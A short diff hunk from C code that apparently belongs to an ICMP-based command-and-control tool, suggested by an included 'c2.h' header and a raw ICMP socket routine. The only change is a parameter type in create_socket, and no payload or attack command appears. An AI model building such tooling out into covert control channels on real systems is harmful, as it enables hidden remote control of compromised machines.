@@ -8,7 +8,7 @@
 #include "../include/c2.h"
 
 // creates a raw ICMP socket and binds it
-int create_socket(unsigned char *interface_to_bind) {
+int create_socket(char *interface_to_bind) {
     int sockfd;
 
     // create the raw ICMP socket
